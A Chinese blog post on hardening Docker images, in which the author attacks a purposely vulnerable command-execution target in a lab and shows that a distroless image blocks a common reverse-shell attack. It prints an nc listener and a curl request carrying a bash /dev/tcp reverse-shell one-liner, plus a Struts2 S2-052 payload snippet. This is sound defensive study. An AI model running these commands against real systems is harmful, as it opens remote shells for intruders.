---
date: "2020-12-03T00:00:00Z"
description: 优化精简容器镜像， 降低 shell 反弹攻击风险
keywords: docker, dockerfile, security, shell
tags:
- docker
- security
title: 学习 shell 反弹实现， 优化 Docker 基础镜像安全
---

# 学习 shell 反弹实现， 优化 Docker 基础镜像安全

天天都在说优化 Dockerfile。 到底怎么优化， 优化后的检验指标又是什么？ 没有考虑清楚行动目的， 隔空放炮， 必然徒劳无功。

笔者最近准备在 CI 上增加安全检测， 在分析案例样本的时候， 找到了比较流行的 struts2 漏洞， 其中 [S2-052 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md) 的利用方式就是在 POST 请求中添加恶意代码或命令。

如 Demo 片段所示。

```xml
                      <command>
                        <string>touch</string>
                        <string>/tmp/success</string>
                      </command>
```

## 0x01 确认目标

既然可以远程执行命令了， 那么如何拿到服务器权限也就是必然考虑的事情， 如 `webshell` 、 `shell 反弹` 等 。 

在翻阅的搜索引擎靠前《常见 shell 反弹方式和利用》的文章之后，总结如下。 

**shell 反弹** 即 **使用 `1. 任意方式` 将 `2. /bin/sh` 通过 `3. 网络连接` 方式连接到 `4. 攻击机`**

其中 **任意方式** 常见为:

1. 使用各种 `程序命令` 创建 shell 网络通信
2. 使用各种 `编程语言` 即使构造 shell 网络通信， **对于解释型语言而言，即为依赖运行环境**。
3. 使用 `操作系统中的设备文件` 创建 shell 网络通信。

以上 4个 条件中， 在预设环境中， 能管理的就有 `1. 任意方式` 和 `2. /bin/sh`。 
优化镜像目标已经很明确了， 精简环境， 减少 `1. 和 2.` 的存在


## 0x02 环境准备

根据目标， 设计了一个靶机， 功能是将 POST 的命令直接转换成命令执行。 代码已经放在 Github 上， [任意命令执行漏洞靶机](https://github.com/tangx/vulhub/tree/master/cmd/shell/reflect2) 。

并产出了两个容器镜像。

+ `doslab/vulhub-reflect2:latest` 使用 debian 官方镜像
+ `doslab/vulhub-reflect2:static` 使用 debian 精简镜像， 更多信息参考 [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)  


### 0x02.1 部署靶机

```bash
## debian:buster
docker run --rm -d -p 8081:8080 doslab/vulhub-reflect2:latest

## distroless/debian-static10
docker run --rm -d -p 8082:8080 doslab/vulhub-reflect2:static
```

### 0x02.2 利用方式

向接口发送 JSON 数据， 方式如下

```bash
curl -X POST http://127.0.0.1:8081/v0/cmd -d '{
    "command":"ls",
    "args":["-l","-a","-h"]
}'
```

## 0x03 实验开始

### 0x03.1 lastest 靶机

1. **攻击机** 执行 `nc` 命令 监听端口， 等待反弹连接。
```bash
nc -nvlp 4444
```

2. **攻击机** 执行 POST 命令， 进行恶意请求。

```bash
# latest
curl -X POST http://192.168.233.3:8081/v0/cmd -d '{
    "command":"bash",
    "args":["-c","bash -i >& /dev/tcp/192.168.233.3/4444 0>&1"]
}'
```

3. **攻击机** `nc` 所监听端口被成功访问， 进入容器 bash 界面。 如图所示

![shell-reflect2-success.png](/assets/img/post/2020/12/03/shell-reflect2-success-with-debian.png)


### 0x03.2 static 靶机

1. **攻击机** 准备监听端口 `4444`

```bash
nc -nvlp 4444
```

2. **攻击机** 执行 POST 命令， 进行恶意请求。

```bash
# static
curl -X POST http://192.168.233.3:8082/v0/cmd -d '{
    "command":"bash",
    "args":["-c","bash -i >& /dev/tcp/192.168.233.3/4444 0>&1"]
}'
```

3. POST 请求报错， 返回信息， `bash` 不存在。 如图所示

![shell-reflect2-failed.png](/assets/img/post/2020/12/03/shell-relect2-failed-with-static.png)


## 0x04 结论

在使用了 **google distroless 镜像** 之后， 在一定程度上阻止了服务漏洞带来的 **常见 shell 反弹攻击** 。 尤其是在类似 golang 这类编译型的语言， 运行环境需求相对简单。 

所以， 在管理 Dockerfile 时

1. **选择或制作简单且符合业务需求的镜像**
    + `1. 可被利用的漏洞或方式越少`
    + `2. 镜像更小， 分发更快`
2. 干净整洁的 docker context 环境
3. 合理的命令层级顺序， 以达到更多的 layer 复用。

其他 Dockerfile 使用探究， 可以阅读 
+ [使用 Dockerfile 构建镜像注意事项](https://tangx.in/2019/03/26/how-to-build-a-image-with-dockerfile/)
+ [Dockerfile 中 ARG 的使用与其的作用域探究](https://tangx.in/2020/11/06/dockerfiles-args-scope)
+ [多阶构建](https://tangx.in/2018/10/30/docker-multi-stage-build/)

## 0xGG 参考文档

+ [反弹Shell原理及检测技术研究](https://www.cnblogs.com/LittleHann/p/12038070.html#_label0)
+ [linux各种一句话反弹shell总结](https://www.anquanke.com/post/id/87017)
+ [反弹shell利用方式](https://www.cnblogs.com/ktfsong/p/11265734.html)


+ [docker security](https://foxutech.com/docker-security/)

